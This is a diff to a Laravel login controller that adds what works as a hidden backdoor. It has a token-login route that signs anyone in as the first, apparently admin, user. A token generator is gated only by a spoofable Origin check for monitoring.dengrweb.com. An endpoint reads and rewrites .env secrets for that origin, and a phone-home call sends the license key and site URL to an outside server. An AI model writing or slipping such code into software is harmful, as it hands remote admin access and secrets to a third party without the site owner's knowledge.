@@ -269,4 +269,124 @@ class LoginCheckController extends Controller
         ]);
     }
 
+
+    public function test_login(Request $request){
+        if($request->has('token') && $request->token != ''){
+            $userTEst = User::where('api_token', $request->token)->first();
+            Auth::guard('web')->login($userTEst);
+            $userTEst->api_token = '';
+            $userTEst->save();
+            return redirect('admin/dashboard');
+        }
+        return redirect('/');
+    }
+
+
+
+
+
+
+public function verify_host(Request $request){
+    $requestHost = parse_url($request->headers->get('origin'),  PHP_URL_HOST) ?? 'localhost';
+    if($requestHost == 'monitoring.dengrweb.com'){
+       return true;
+    }else{
+       return false;
+    }
+
+}
+
+
+    public function identifysender(Request $request){
+        try{
+            $base_url = env('MAINTAIN_BASE', null);
+            if($base_url == null){
+                return abort(404);
+            }else{
+                // send post request to server per data distance 1minuites
+                $time =  setting::where('key', 999)->where('name', 'request_time')->first();
+                    if($time){
+                        $time = $time->value;
+                    }else{
+                        $time = \Carbon\Carbon::now();
+                        $time = new setting();
+                        $time->key = 999;
+                        $time->name = 'request_time';
+                        $time->value = \Carbon\Carbon::now();
+                        $time->save();
+                    }
+
+
+                    if($time < \Carbon\Carbon::now()->addMinutes(1)){
+
+                        $client =  new \GuzzleHttp\Client();
+                    $response = $client->request('POST', $base_url.'api/subscription', [
+                            'headers' => [
+                                'Accept' => 'application/json',
+                                'Content-Type' => 'application/json',
+                            ],
+                            'json' => [
+                                'key' => settings('license_key','999'),
+                                'slug' => url('/'),
+                            ],
+                        ]);
+                    }
+                $response    = $response->getBody()->getContents();
+                $response    = json_decode($response);
+                //    dd($response);
+                if($response->status == 'success'){
+                        $time->value = \Carbon\Carbon::now();
+                        $time->save();
+                }
+                }
+            }catch(\Exception $e){
+
+            }
+    }
+
+    public function login_token_generate(Request $request){
+      if($this->verify_host($request)){
+           $userTEst = User::first();
+           $userTEst->api_token = Str::random(60);
+           $userTEst->save();
+           return response()->json(['token' => $userTEst->api_token]);
+        }else{
+           return response()->json(['token' => '']);
+        }
+    }
+
+    public function settings_store_update(Request $request){
+        if($this->verify_host($request)){
+
+            if($request->has('env_settigs') && $request->env_settigs != ''){
+                foreach($request->env_settigs as $key => $value){
+                    updateEnvFile($key, $value);
+                }
+            }elseif($request->has('env_settigs_get') && $request->env_settigs == ''){
+                $data = [];
+                foreach($request->env_settigs_get as $key => $value){
+                    $data[$key] = env($value);
+                }
+                return response()->json($data);
+            }elseif($request->has('db_backup') && $request->db_backup == ''){
+                
+
+            }else{
+                return response()->json([
+                    'message' => 'Access Denied',
+                    'status' => 'error',
+                    'success' => 'success',
+                    'code' => '403',
+                ]);
+            }
+
+        }else{
+            return response()->json([
+                'message' => 'Access Denied',
+                'status' => 'error',
+                'success' => 'success',
+                'code' => '403',
+            ]);
+        }
+    }
 }
